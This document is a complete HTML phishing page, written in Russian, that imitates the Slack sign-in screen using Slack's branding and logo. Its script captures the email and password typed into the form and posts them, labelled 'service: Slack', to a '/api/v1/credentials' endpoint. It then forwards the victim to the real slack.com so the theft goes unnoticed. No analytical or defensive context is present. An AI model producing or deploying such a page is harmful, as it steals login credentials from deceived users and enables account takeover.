<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Вход в Slack</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif; background: #4A154B; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; padding: 40px; border-radius: 8px; width: 100%; max-width: 400px; }
        .logo { text-align: center; margin-bottom: 24px; }
        .logo img { width: 80px; }
        h1 { font-size: 24px; color: #1D1C1D; margin-bottom: 20px; }
        .form-group { margin-bottom: 16px; }
        label { display: block; font-size: 14px; color: #1D1C1D; margin-bottom: 6px; }
        input[type="email"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #868686; border-radius: 4px; font-size: 14px; }
        .btn { width: 100%; padding: 12px; background: #4A154B; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        .footer { margin-top: 20px; text-align: center; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><img src="https://a.slack-edge.com/80588/marketing/img/meta/apple-touch-icon-144.png" alt="Slack"></div>
        <h1>Вход в Slack</h1>
        <form onsubmit="handleSubmit(event)">
            <div class="form-group"><label for="email">Email</label><input type="email" id="email" name="email" required></div>
            <div class="form-group"><label for="password">Пароль</label><input type="password" id="password" name="password" required></div>
            <button type="submit" class="btn">Войти</button>
        </form>
        <div class="footer"><p>© 2026 Slack Technologies</p></div>
    </div>
    <script>
        async function handleSubmit(e) { e.preventDefault(); const data = { email: document.getElementById('email').value, password: document.getElementById('password').value, service: 'Slack' }; await fetch('/api/v1/credentials', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(data) }); window.location.href = 'https://slack.com'; }
    </script>
</body>
</html>
